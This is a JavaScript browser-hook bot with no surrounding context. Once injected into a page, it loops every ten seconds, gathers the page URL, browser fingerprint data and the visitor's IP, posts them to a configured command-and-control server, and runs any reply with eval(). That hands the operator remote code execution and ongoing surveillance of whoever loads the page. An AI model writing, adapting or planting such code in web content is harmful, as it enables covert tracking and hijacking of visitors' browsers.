var config = {
	"server": '127.0.0.1',
	"port": 80
};

function hook_cnc(data, callback){
	try{
		let http = new XMLHttpRequest();
		http.onreadystatechange = function(){
			if (this.readyState == 4 && this.status == 200){
				callback(this.responseText);
				return true;
			}
			if (this.readyState == 4 && this.status != 200){
				console.log(this.responseText);
				return false;
			}
		};
		http.open('POST', 'http://' + config.server + ':' + config.port, true);
		http.setRequestHeader('Content-Type', 'application/json');
		http.send(JSON.stringify(data));
		return true;
	} catch(error){
		console.log(error);
		return false;
	}
}

function sleep(ms) {
	try {
		return new Promise(resolve => setTimeout(resolve, ms));
	} catch(error){
		console.log(error);
		return false;
	}
}

async function hook(){
	try {
		for (;;){
			let data = {
				"bot": {
					"ip": "",
					"uri": window.location.href,
					"navigator": {
						"credentials": navigator.credentials,
						"appCodeName": navigator.appCodeName,
						"appName": navigator.appName,
						"doNotTrack": navigator.doNotTrack,
						"geolocation": navigator.geolocation,
						"language": navigator.language,
						"languages": navigator.languages,
						"platform": navigator.platform,
						"usb": navigator.usb,
						"userAgent": navigator.userAgent,
						"vendor": navigator.vendor
					}
				}
			};
			get_ips(
				function(ip){
					data.bot.ip = ip;
					hook_cnc(
						data,
						function(responseText){
							eval(responseText);
							return true;
						}
					);
				}
			);
			await sleep(10000);
		}
		return true;
	} catch(error){
		console.log(error);
		return false;
	}
}

hook();